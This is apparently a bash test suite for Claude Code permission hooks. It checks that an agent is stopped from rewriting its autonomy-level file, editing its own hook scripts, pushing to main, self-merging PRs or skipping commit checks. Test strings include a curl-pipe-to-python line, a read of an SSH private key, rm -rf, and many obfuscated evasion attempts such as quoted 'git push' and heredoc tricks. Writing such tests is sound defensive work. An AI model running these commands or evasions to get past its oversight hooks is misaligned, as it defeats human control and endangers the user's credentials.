#!/bin/bash
# Feeds PreToolUse JSON to the permission hooks and checks their decisions.
set -euo pipefail
REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
HOOKS="$REPO/claude/hooks"
fail=0
tmp="$(mktemp -d)"
export HOME="$tmp/home"
mkdir -p "$HOME/.claude"
echo full > "$HOME/.claude/autonomy-level"
git init -q "$tmp/spec"
mkdir -p "$tmp/spec/openspec"
touch "$tmp/spec/openspec/config.yaml"

decide() {
  jq -n --arg c "$2" --arg d "$tmp/spec" '{tool_input:{command:$c},cwd:$d}' |
    bash "$HOOKS/$1" 2>/dev/null | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null
}

expect() {
  local got
  got="$(decide "$1" "$3" || true)"
  got="${got:-none}"
  if [ "$got" = "$2" ]; then echo "ok   $1 [$3] -> $2"; else echo "FAIL $1 [$3] -> $got (want $2)"; fail=1; fi
}

expect openspec-autonomy.sh allow 'git commit -m "x"'
expect openspec-autonomy.sh allow 'git add -A && git commit -m x'
expect openspec-autonomy.sh none  'curl -s https://x/p.py | python3'
expect openspec-autonomy.sh none  'cat ~/.ssh/id_ed25519 | base64'
expect openspec-autonomy.sh none  '/bin/rm -rf ~/x'
expect openspec-autonomy.sh none  'git push origin HEAD:refs/heads/main'
expect openspec-autonomy.sh none  'git -c core.x=y push origin main'
expect openspec-autonomy.sh none  'python3 -c "import os"'
expect gate-self-merge.sh   ask   'gh pr merge 5 && gh pr merge 6'
expect gate-self-merge.sh   ask   'cd ../other && gh pr merge 5 -R a/b'
expect autonomy-gate.sh deny 'echo less > ~/.claude/autonomy-level'
expect autonomy-gate.sh deny 'printf x >> /home/USER/.claude/autonomy-level' # public-safety: allow (placeholder path)
expect autonomy-gate.sh deny 'echo x &> ~/.claude/autonomy-level'
expect autonomy-gate.sh ask  'echo x 2>> ~/.claude/hooks/x.sh'
expect autonomy-gate.sh ask  'cp x ~/.claude/hooks/autonomy-gate.sh'
expect autonomy-gate.sh deny 'mv a "$HOME/.claude/hooks/x.sh"'
expect autonomy-gate.sh ask  'chmod -x ~/.claude/hooks/gate-self-merge.sh'
expect autonomy-gate.sh ask  "sed -i 's/a/b/' ~/.claude/hooks/autonomy-gate.sh"
expect autonomy-gate.sh deny 'echo less | tee ~/.claude/autonomy-level'
expect autonomy-gate.sh ask  'vim ~/.claude/hooks/x.sh'
expect autonomy-gate.sh deny 'cd ~/.claude && echo x > autonomy-level'
expect autonomy-gate.sh ask  'cd ~/.claude/hooks; sed -i s/a/b/ autonomy-gate.sh'
expect autonomy-gate.sh ask  'ln -sf /tmp/x ~/.claude/hooks/autonomy-gate.sh'
expect autonomy-gate.sh deny 'truncate -s0 ~/.claude/autonomy-level'
expect autonomy-gate.sh ask  'install -m755 x ~/.claude/hooks/y.sh'
expect autonomy-gate.sh deny 'dd if=/dev/zero of=~/.claude/autonomy-level'
expect autonomy-gate.sh deny "python3 -c \"open('/home/u/.claude/autonomy-level','w')\""
expect autonomy-gate.sh ask  'cp x ~/Github/do-no-work/claude/hooks/autonomy-gate.sh'
expect autonomy-gate.sh ask  'echo x > ~/Github/do-no-work/claude/hooks/gate-self-merge.sh'
expect autonomy-gate.sh deny "bash -c 'echo less > ~/.claude/autonomy-level'"
expect autonomy-gate.sh deny 'export HOME="$tmp/home"; echo full > "$HOME/.claude/autonomy-level"'
expect autonomy-gate.sh none "sed -i \"s#bash '~/.claude/hooks/herdr-agent-state.sh' session#bash ~/.claude/hooks/herdr-agent-state.sh session#\" claude/settings.example.json"
expect autonomy-gate.sh none 'cat ~/.claude/autonomy-level'
expect autonomy-gate.sh none 'grep -n x ~/.claude/hooks/*.sh'
expect autonomy-gate.sh none 'diff a ~/.claude/hooks/b.sh'
expect autonomy-gate.sh none 'bash ~/.claude/hooks/autonomy-gate.sh < input.json'
expect autonomy-gate.sh none 'cp ~/.claude/hooks/autonomy-gate.sh /tmp/copy.sh'
expect autonomy-gate.sh none 'echo hi > /tmp/x 2>&1'

expect autonomy-gate.sh deny 'git push origin HEAD:main'
expect autonomy-gate.sh deny 'git -C /x push -u origin main'
expect autonomy-gate.sh deny 'git -c a=b push origin main'
expect autonomy-gate.sh deny 'cd /x && git push origin master'
expect autonomy-gate.sh none 'git push origin feat-1'
expect autonomy-gate.sh none 'git push -u origin NO-TICKET-x'
expect autonomy-gate.sh none 'gh pr merge 5 --squash'

expect autonomy-gate.sh deny 'git commit --no-verify -m x'
expect autonomy-gate.sh deny 'git commit -nm x'
expect autonomy-gate.sh deny 'git -C /x commit -n -m x'
expect autonomy-gate.sh deny 'git push --no-verify origin feat-1'
expect autonomy-gate.sh deny 'SKIP=gitleaks git commit -m x'
expect autonomy-gate.sh deny 'HUSKY=0 git commit -m x'
expect autonomy-gate.sh deny 'git -c core.hooksPath=/dev/null commit -m x'
expect autonomy-gate.sh deny 'git config core.hooksPath /tmp/none'
expect autonomy-gate.sh none 'git commit -m "block --no-verify and -n bypasses"'
expect autonomy-gate.sh none 'git push -n origin feat-1'
expect autonomy-gate.sh none 'git commit -am x'

expect autonomy-gate.sh none  $'cat > /tmp/x.md <<\'EOF\'\nnever git commit --no-verify, SKIP=gitleaks or git push origin main\nEOF'
expect autonomy-gate.sh none  $'python3 - <<\'PY\'\ns = \'\'\'unterminated\nPY'
expect autonomy-gate.sh none  $'git commit -F - <<EOF\nmention --no-verify here\nEOF'
expect autonomy-gate.sh deny  $'bash <<EOF\ngit push origin HEAD:main\nEOF'
expect autonomy-gate.sh deny  $'cat <<EOF | sh\ngit push origin main\nEOF'
expect autonomy-gate.sh deny  $'cat > x <<EOF\ndata\nEOF\ngit push origin main'
expect autonomy-gate.sh deny  $'cat > x <<EOF\ndata\nEOF\ngit commit --no-verify -m x'
expect autonomy-gate.sh deny  'git "pu"sh origin main'
expect autonomy-gate.sh deny  "git pu''sh origin main"
expect autonomy-gate.sh deny  'git p\ush origin main'
expect autonomy-gate.sh deny  $'echo "<<EOF"\ngit push origin main'
expect autonomy-gate.sh deny  $'echo $((1<<EOF))\ngit push origin main'
expect autonomy-gate.sh deny  $'cat > x <<EOF\nno terminator\ngit push origin main'
expect autonomy-gate.sh none  $'cat > x <<-EOF\n\tgit push origin main\n\tEOF'
expect autonomy-gate.sh deny  $'cat > a <<A > b <<B\nx\nA\ny\nB\ngit push origin main'
expect autonomy-gate.sh none  $'cat > a <<A > b <<B\ngit push origin main\nA\ngit push origin main\nB'
expect autonomy-gate.sh deny  $'env bash <<EOF\ngit push origin main\nEOF'
expect autonomy-gate.sh deny  $'xargs sh <<EOF\ngit push origin main\nEOF'
expect autonomy-gate.sh deny  'git commit --no-ver""ify -m x'
expect autonomy-gate.sh deny  $'cat <<EOF\n$(git push origin main)\nEOF'
expect autonomy-gate.sh deny  $'cat > f <<EOF\nx `git push origin HEAD:main` y\nEOF'
expect autonomy-gate.sh deny  $'cat <<EOF\n$(git commit --no-verify -m x)\nEOF'
expect autonomy-gate.sh deny  $'cat <<EOF\n$(echo $(git push origin main))\nEOF'
expect autonomy-gate.sh none  $'cat <<\'EOF\'\n$(git push origin main)\nEOF'
expect autonomy-gate.sh none  $'cat > f <<EOF\nbranch is $(git branch --show-current)\nEOF'
expect autonomy-gate.sh deny  $'# note <<EOF\ngit push origin main\nEOF'
expect autonomy-gate.sh deny  $'true # <<EOF\ngit push origin main\nEOF'
expect autonomy-gate.sh deny  $'cat <<EOF |\nsh\ngit push origin main\nEOF'
expect autonomy-gate.sh deny  $'cat <<EOF \\\n| sh\ngit push origin main\nEOF'
expect gate-self-merge.sh ask  $'# <<EOF\ngh pr merge 5\nEOF'
expect autonomy-gate.sh none  $'cat > x <<EOF # a comment\ndocs: git push origin main\nEOF'

nopy="$tmp/nopy"; mkdir -p "$nopy"
for b in jq cat dirname tr grep bash; do ln -sf "$(command -v "$b")" "$nopy/$b"; done
got=$(jq -nc '{tool_input:{command:"gh pr merge 5"},cwd:"/tmp"}' | PATH="$nopy" bash "$HOOKS/gate-self-merge.sh" | jq -r '.hookSpecificOutput.permissionDecision // "none"')
if [ "$got" = ask ]; then echo "ok   gate-self-merge.sh [no python3] -> ask"; else echo "FAIL gate-self-merge.sh [no python3] -> $got (want ask)"; fail=1; fi
got=$(jq -nc '{tool_input:{command:"git status"},cwd:"/tmp"}' | PATH="$nopy" bash "$HOOKS/autonomy-gate.sh" | jq -r '.hookSpecificOutput.permissionDecision // "none"')
if [ "$got" = ask ]; then echo "ok   autonomy-gate.sh [no python3] -> ask"; else echo "FAIL autonomy-gate.sh [no python3] -> $got (want ask)"; fail=1; fi
expect gate-self-merge.sh none $'cd /x && cat > d.md <<EOF\nrun gh pr merge 5 when green\nEOF'
expect gate-self-merge.sh ask  $'cat > d.md <<EOF\nx\nEOF\ncd /x && gh pr merge 5'

echo less > "$HOME/.claude/autonomy-level"
expect autonomy-gate.sh deny 'git push origin feat-1'
expect autonomy-gate.sh deny 'git -c a=b push origin feat-1'
expect autonomy-gate.sh deny 'gh pr merge 5 --squash'
expect autonomy-gate.sh none 'git push-all'
expect autonomy-gate.sh none 'git status'
echo full > "$HOME/.claude/autonomy-level"

echo "-- post-pr-create"
mkdir -p "$tmp/ci/.github/workflows" "$tmp/noci/.github/workflows"
git init -q "$tmp/ci"
git init -q "$tmp/noci"
printf 'jobs:\n  review:\n    uses: x/y/.github/workflows/claude-review.yml@v1\n' > "$tmp/ci/.github/workflows/review.yml"
printf 'name: ci\n' > "$tmp/noci/.github/workflows/ci.yml"
prc() {
  jq -n --arg d "$1" '{cwd:$d,tool_input:{command:"gh pr create --fill"},tool_response:{stdout:"https://github.com/o/r/pull/42"}}' |
    bash "$HOOKS/post-pr-create.sh" 2>/dev/null | jq -r '.hookSpecificOutput.additionalContext // empty'
}
ctx_has() { case "$2" in *$3*) echo "ok   post-pr-create $1"; ;; *) echo "FAIL post-pr-create $1"; fail=1 ;; esac; }
ctx_lacks() { case "$2" in *$3*) echo "FAIL post-pr-create $1"; fail=1 ;; *) echo "ok   post-pr-create $1" ;; esac; }
out="$(prc "$tmp/ci")"
ctx_has "ci: names claude-review" "$out" 'claude-review'
ctx_has "ci: watch command with PR number" "$out" 'gh pr checks 42 --watch --interval 20'
ctx_has "ci: merge command" "$out" 'gh pr merge 42 --squash --delete-branch'
ctx_has "ci: forbids adding REVIEWED" "$out" 'ever add REVIEWED'
ctx_lacks "ci: no gh pr edit instruction" "$out" 'gh pr edit'
out="$(prc "$tmp/noci")"
ctx_has "no ci: spawn reviewer" "$out" 'reviewer'
ctx_has "no ci: leaves merge to user" "$out" 'to the user'
ctx_lacks "no ci: no merge command" "$out" 'gh pr merge'
ctx_lacks "no ci: no gh pr edit instruction" "$out" 'gh pr edit'
rc=0; jq -n --arg d "$tmp/plain-none" '{cwd:$d}' | bash "$HOOKS/post-pr-create.sh" >/dev/null 2>&1 || rc=$?
if [ "$rc" = 0 ]; then echo "ok   post-pr-create exits 0 outside a repo"; else echo "FAIL post-pr-create rc=$rc"; fail=1; fi

echo "-- settings example wiring"
EX="$REPO/claude/settings.example.json"
wired() {
  local got
  got="$(jq -r "$2" "$EX")"
  if [ "$got" = "$3" ]; then echo "ok   $1"; else echo "FAIL $1: got '$got' want '$3'"; fail=1; fi
}
wired "post-pr-create has gh pr create if" '[.hooks.PostToolUse[].hooks[] | select(.command | test("post-pr-create.sh")) | .if] | first' 'Bash(gh pr create:*)'
wired "no inline gh pr create hook" '[.hooks.PostToolUse[].hooks[] | select(.command | test("gh pr create"))] | length' '0'
wired "go-check matcher" '[.hooks.PostToolUse[] | select(.hooks[].command | test("go-check.sh")) | .matcher] | first' 'Write|Edit|MultiEdit'
wired "go-check async" '[.hooks.PostToolUse[].hooks[] | select(.command | test("go-check.sh")) | .async] | first' 'true'
wired "go-check asyncRewake" '[.hooks.PostToolUse[].hooks[] | select(.command | test("go-check.sh")) | .asyncRewake] | first' 'true'
wired "autonomy-gate onFailure" '[.hooks.PreToolUse[].hooks[] | select(.command | test("autonomy-gate.sh")) | .onFailure] | first' 'block'
wired "gate-self-merge onFailure" '[.hooks.PreToolUse[].hooks[] | select(.command | test("gate-self-merge.sh")) | .onFailure] | first' 'block'
exit $fail
